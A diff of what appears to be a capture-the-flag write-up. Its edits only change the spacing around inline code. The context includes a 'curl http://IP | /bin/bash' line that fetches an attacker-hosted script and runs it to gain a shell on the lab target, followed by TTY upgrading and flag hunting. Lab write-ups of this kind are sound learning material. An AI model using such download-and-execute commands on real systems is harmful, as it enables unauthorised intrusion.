@@ -163,7 +163,7 @@ curl http://IP | /bin/bash
 
 ![](/images/gaining_access.png)
 
-This will cause `curl` to send a web request to our server, retrieve the content of `index.html` (which is a Bash script), and then pipe it to `/bin/bash` for execution.
+This will cause `curl`  to send a web request to our server, retrieve the content of  `index.html`  (which is a Bash script), and then pipe it to  `/bin/bash`  for execution.
 
 We press Enter and...
 
@@ -210,7 +210,7 @@ export SHELL=/bin/bash
 
 ![](/images/tty_finally.png)
 
-Now that we’ve started looking for the `user.txt` flag, I found a user named `jake` in the `/home/` directory.
+Now that we’ve started looking for the  `user.txt`  flag, I found a user named  `jake`  in the  `/home/`  directory.
 
 ![](/images/listing_home.png)
 
